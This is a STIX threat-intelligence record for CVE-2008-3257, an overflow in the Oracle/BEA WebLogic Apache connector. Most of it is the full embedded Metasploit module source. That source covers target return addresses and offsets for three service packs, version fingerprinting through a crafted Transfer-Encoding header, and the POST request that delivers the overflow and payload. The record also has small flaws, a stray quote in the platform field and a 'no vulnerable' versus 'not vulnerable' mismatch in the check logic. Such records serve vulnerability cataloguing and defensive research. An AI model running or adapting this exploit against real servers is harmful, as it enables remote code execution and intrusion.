{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9d3589ac-2c64-4d29-a268-c9e749c4fe3b",
    "created": "2024-08-14T16:54:33.466555Z",
    "modified": "2024-08-14T16:54:33.466559Z",
    "name": "Oracle Weblogic Apache Connector POST Request Buffer Overflow",
    "description": " This module exploits a stack based buffer overflow in the BEA Weblogic Apache plugin.  The connector fails to properly handle specially crafted HTTP POST requests, resulting a buffer overflow due to the insecure usage of sprintf.  Currently, this module works over Windows systems without DEP and has been tested with Windows 2000 / XP.  In addition, the Weblogic Apache plugin version is fingerprinted with a POST request containing a specially crafted Transfer-Encoding header. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/bea_weblogic_post_bof.rb",
            "external_id": "bea_weblogic_post_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-3257"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerprint = { :pattern => [ /Apache/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Oracle Weblogic Apache Connector POST Request Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack based buffer overflow in the BEA\n        Weblogic Apache plugin.\n\n        The connector fails to properly handle specially crafted HTTP POST\n        requests, resulting a buffer overflow due to the insecure usage\n        of sprintf.  Currently, this module works over Windows systems without DEP,\n        and has been tested with Windows 2000 / XP.\n\n        In addition, the Weblogic Apache plugin version is fingerprinted with a POST\n        request containing a specially crafted Transfer-Encoding header.\n      },\n      'Author'         =>\n        [\n          'KingCope', # Vulnerability Discovery and PoC\n          'juan vazquez', # Metasploit Module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-3257' ],\n          [ 'OSVDB', '47096' ],\n          [ 'BID', '30273' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Privileged'     => true,\n      'Platform'       => 'win',\n      'Payload'        =>\n        {\n          'Space'    => 4000,\n          'BadChars' => \"\\x00\\x0d\\x0a\\x3f\"\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [  'BEA WebLogic 8.1 SP6 - mod_wl_20.so / Apache 2.0 / Windows [XP/2000]',\n            {\n              'Ret' => 0x10061f63, # push esp # ret # mod_wl_20.so\n              'Offset' =>  4102\n            }\n          ],\n          [  'BEA WebLogic 8.1 SP5 - mod_wl_20.so / Apache 2.0 / Windows [XP/2000]',\n            {\n              'Ret' => 0x10061473, # push esp # ret # mod_wl_20.so\n              'Offset' =>  4102\n            }\n          ],\n          [  'BEA WebLogic 8.1 SP4 - mod_wl_20.so / Apache 2.0 / Windows [XP/2000]',\n            {\n              'Ret' => 0x10020e31, # push esp # ret # mod_wl_20.so\n              'Offset' =>  4102\n            }\n          ]\n        ],\n      'DisclosureDate' => '2008-07-17',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI path to a jsp or object provided by Weblogic', '/index.jsp']),\n      ])\n\n  end\n\n\n  def check\n\n    fingerprint = fingerprint_mod_wl\n    print_status \"#{rhost}:#{rport} - #{fingerprint}\"\n\n    case fingerprint\n    when /Version found/\n      return Exploit::CheckCode::Appears\n    when /BEA WebLogic connector vulnerable/\n      return Exploit::CheckCode::Appears\n    when /BEA WebLogic connector undefined/\n      return Exploit::CheckCode::Detected\n    when /BEA WebLogic connector no vulnerable/, /BEA WebLogic connector not found/\n      return Exploit::CheckCode::Safe\n    end\n\n  end\n\n  def exploit\n\n    # Autodetect BEA mod_wl version\n    my_target = get_target\n\n    # Avoid the attack if the victim doesn't have the same setup we're targeting\n    if my_target.nil?\n      print_error(\"BEA mod_weblogic not supported\")\n      return\n    end\n\n    uri = normalize_uri(target_uri.path)\n    sploit = rand_text_alphanumeric(my_target['Offset']-uri.length)\n    sploit << [my_target.ret].pack(\"V\")\n    sploit << payload.encoded\n\n    send_request_cgi({\n      'method'  => 'POST',\n      'uri'     => \"#{uri} #{sploit}\",\n    })\n\n    handler\n\n  end\n\n  def get_target\n\n    return target if target.name != 'Automatic'\n\n    fingerprint = fingerprint_mod_wl\n\n    case fingerprint\n    when /BEA WebLogic 8.1 SP6 - mod_wl_20.so/\n      return targets[1]\n    when /BEA WebLogic 8.1 SP5 - mod_wl_20.so/\n      return targets[2]\n    when /BEA WebLogic 8.1 SP4 - mod_wl_20.so/\n      return targets[3]\n    else\n      return nil\n    end\n\n  end\n\n  def fingerprint_mod_wl\n\n    my_data = rand_text_alpha(rand(5) + 8)\n    res = send_request_cgi(\n        {\n          'method'  => 'POST',\n          'uri'     => normalize_uri(target_uri.path),\n          'headers' =>\n            {\n              'Transfer-Encoding' => my_data\n            },\n          'data' => \"#{my_data.length}\\r\\n#{my_data}\\r\\n0\\r\\n\",\n        })\n\n    if res and res.code == 200 and res.body =~ /Weblogic Bridge Message/\n      # BEA WebLogic 8.1 SP6 - mod_wl_20.so\n      case res.body\n      when (/Build date\\/time:<\\/B> <I>Jun 16 2006 15:14:11/ and /Change Number:<\\/B> <I>779586/)\n        return \"Version found: BEA WebLogic 8.1 SP6 - mod_wl_20.so\"\n      # BEA WebLogic 8.1 SP5 - mod_wl_20.so\n      when (/Build date\\/time:<\\/B> <I>Aug  5 2005 11:19:57/ and /Change Number:<\\/B> <I>616810/)\n        return \"Version found: BEA WebLogic 8.1 SP5 - mod_wl_20.so\"\n      when (/Build date\\/time:<\\/B> <I>Oct 25 2004 09:25:23/ and /Change Number:<\\/B> <I>452998/)\n        return \"Version found: BEA WebLogic 8.1 SP4 - mod_wl_20.so\"\n      # Check for dates prior to patch release\n      when /([A-Za-z]{3} [\\s\\d]{2} [\\d]{4})/\n        build_date = Date.parse($1)\n        if build_date <= Date.parse(\"Jul 28 2008\")\n          return \"BEA WebLogic connector vulnerable\"\n        else\n          return \"BEA WebLogic connector not vulnerable\"\n        end\n      else\n        return \"BEA WebLogic connector undefined\"\n      end\n    end\n\n    return \"BEA WebLogic connector not found\"\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-07-17",
    "x_mitre_platforms": [
        "win'"
    ]
}